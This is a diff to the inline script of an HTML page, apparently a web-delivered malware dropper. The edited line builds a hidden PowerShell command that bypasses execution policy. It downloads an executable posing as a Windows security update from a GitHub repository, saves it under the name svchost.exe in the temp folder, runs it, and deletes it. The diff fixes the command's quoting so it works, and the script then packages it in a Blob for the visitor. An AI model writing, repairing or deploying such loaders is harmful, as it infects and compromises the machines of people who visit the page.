@@ -3,7 +3,7 @@
 <body>
 <script>
 // Replace this with your ACTUAL long PowerShell command
-var psCommand = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u='https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe"'; $f='$env:temp\svchost.exe'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
+var psCommand = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
 
 // Create a temporary PowerShell script to run the command
 var blob = new Blob(['powershell.exe -c "' + psCommand + '"'], {type: 'text/plain'});
